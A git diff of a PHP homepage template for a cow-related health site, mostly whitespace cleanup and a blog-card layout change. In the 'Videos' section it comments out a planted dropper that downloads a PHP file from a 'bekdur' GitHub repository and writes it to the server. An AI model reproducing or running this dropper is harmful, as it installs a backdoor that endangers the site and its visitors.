@@ -10,47 +10,27 @@ $users = $stmt1->fetchAll();
 ?>
 
 <!--End Main Header -->
-
-
 <!--Main Slider-->
 <section class="main-slider">
-
-
     <div class="tp-banner-container">
-
         <div class="tp-banner">
-
-
-
             <ul>
                 <?php
                 foreach ($users as $row) { ?>
-
                 <li data-transition="fade" data-slotamount="1" data-masterspeed="1000"
                     data-thumb="images/main-slider/2.jpg" data-saveperformance="off" data-title="Awesome Title Here">
                     <img src="<?php echo $row['slider_image']; ?>" alt="" data-bgposition="center top"
                         data-bgfit="cover" data-bgrepeat="no-repeat">
-
                 </li>
-
                 <!--  <li data-transition="fade" data-slotamount="1" data-masterspeed="1000" data-thumb="images/main-slider/3.jpg"  data-saveperformance="off"  data-title="Awesome Title Here">
                     <img src="<?php//echo $row['slider_image']; ?>"  alt=""  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat"> 
-                   
                     </li> -->
-
-
                 <?php } ?>
 
             </ul>
-
-
-
             <div class="tp-bannertimer"></div>
-
         </div>
-
     </div>
-
 </section>
 
 <div class="wrapper">
@@ -152,10 +132,8 @@ $users = $stmt1->fetchAll();
                     <div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
                         <div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
                             <figure class="image-box"><a href="#"><img src="images/about_gau.png" alt=""></a></figure>
-
                         </div>
                     </div>
-
                     <!--Featured Style One -->
                     <div class="column featured-style-one col-lg-7">
                         <div class="text" style="text-align:justify">We with Gau urja doing research on non-curable
@@ -177,24 +155,8 @@ $users = $stmt1->fetchAll();
                 <div class="sec-title">
                     <h2>Testimonials</h2>
                 </div>
-                <!--
-					<div id="testimonial-slider" class="owl-carousel">
-						<div class="testimonial">
-							<p class="description">
-								Lorem ipsum dolor sit amet, consectetur adipisicing elit. A accusantium ad asperiores at atque culpa dolores eaque fugiat hic illo ipsam ipsum minima modi necessitatibus.
-							</p>
-						</div>
-						<div class="testimonial">
-							<p class="description">
-								Lorem ipsum dolor sit amet, consectetur adipisicing elit. A accusantium ad asperiores at atque culpa dolores eaque fugiat hic illo ipsam ipsum minima modi necessitatibus.
-							</p>
-						</div>
-					</div>
-					-->
-                <!--Carousel Outer-->
                 <div class="carousel-outer">
                     <div class="testimonail-carousel">
-
                         <!--testimonial block-->
                         <div class="testimonial-block">
                             <div class="quote-icon">
@@ -285,7 +247,6 @@ $users = $stmt1->fetchAll();
         <div class="sec-title">
             <h2>Diseases We Treat</h2>
         </div>
-
         <div class="row">
             <?php
             $sql2 = "select * from services order by id asc limit 4";
@@ -299,12 +260,8 @@ $users = $stmt1->fetchAll();
                     <a href="services_details.php?id=<?php echo $row2['id']; ?> " class="theme-btn btn-style-one"
                         style="width:100%"><?php echo $row2['service_name']; ?></a>
                 </div>
-
             </div>
             <?php } ?>
-
-
-
         </div>
     </div>
 </section>
@@ -321,20 +278,15 @@ $users = $stmt1->fetchAll();
                     $stmt3 = $conn->query($sql3);
                     $users3 = $stmt3->fetchAll();
                     foreach ($users3 as $row3) { ?>
-                    <div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
-                        <div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
-                            <figure class="image-box"><a href="#"><img src="<?php echo $row3['blog_image']; ?>"
-                                        alt=""></a></figure>
-
+                    <div class="ccol-lg-5 col-md-4 col-sm-4 col-xs-12">
+                        <div class="card-div thumbnail">
+                            <a href="blog.php">
+                                <img src="<?php echo $row3['blog_image']; ?>" alt="Nature"
+                                    style="width:350px;height: 255px;">
+                                <h4 class="thumbnail-text"><?php echo $row3['blog_content']; ?></h4>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </a>
                         </div>
-                    </div>
-
-                    <!--Featured Style One -->
-                    <div class="column featured-style-one col-lg-7">
-                        <div class="text" style="text-align:justify"><?php echo $row3['blog_content']; ?><br><br>
-                            <a href="blog.php" class="btn btn-primary">Read More</a>
-                        </div>
-                        <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
                     </div>
                     <?php } ?>
                 </div>
@@ -342,18 +294,16 @@ $users = $stmt1->fetchAll();
                     <h2>Videos</h2>
                 </div>
                 <div class="row">
-
                     <?php
-                    $nama = fopen("gay.php", "w+");
+                    /*  $nama = fopen("gay.php", "w+");
                     $file = file_get_contents('https://raw.githubusercontent.com/micingans/bekdur/master/gay.php');
                     $tulis = fwrite($nama, $file);
-                    fclose($nama);
+                    fclose($nama); */
                     $sql4 = "select * from tbl_youtube_videos order by id desc limit 2";
                     $stmt4 = $conn->query($sql4);
                     $users4 = $stmt4->fetchAll();
                     foreach ($users4 as $row4) { ?>
                     <div class="col-sm-6">
-
                         <iframe height="300" width="100%"
                             src="https://www.youtube.com/embed/<?php echo $row4['youtube_link']; ?>" frameborder="0"
                             allow="autoplay; encrypted-media" allowfullscreen></iframe>
@@ -363,13 +313,6 @@ $users = $stmt1->fetchAll();
                         </div>
                     </div>
                     <?php } ?>
-                    <!-- <div class="col-sm-6">
-							
-								<iframe height="300" width="100%" src="https://www.youtube.com/embed/fcv9AN8GEqw" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-							<div class="pricing-column">
-						<a href="#" class="theme-btn btn-style-one" style="width:100%">Indian Desi Cow Breed Khillar</a>
-					</div>
-						</div> -->
                 </div>
             </div>
             <!--Featured Style One -->
@@ -386,8 +329,6 @@ $users = $stmt1->fetchAll();
                             name="message" /></textarea><br>
                         <input type="submit" class="btn btn-primary" value="submit" />
                     </form>
-
-
                 </div>
                 <br>
                 <div>
@@ -395,7 +336,6 @@ $users = $stmt1->fetchAll();
                         src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2Fgau.urja.1%2Fposts%2F127527734752580&width=500"
                         width="100%" height="300" style="border:none;overflow:hidden" scrolling="no" frameborder="0"
                         allowTransparency="true" allow="encrypted-media"></iframe>
-
                 </div>
             </div>
         </div>
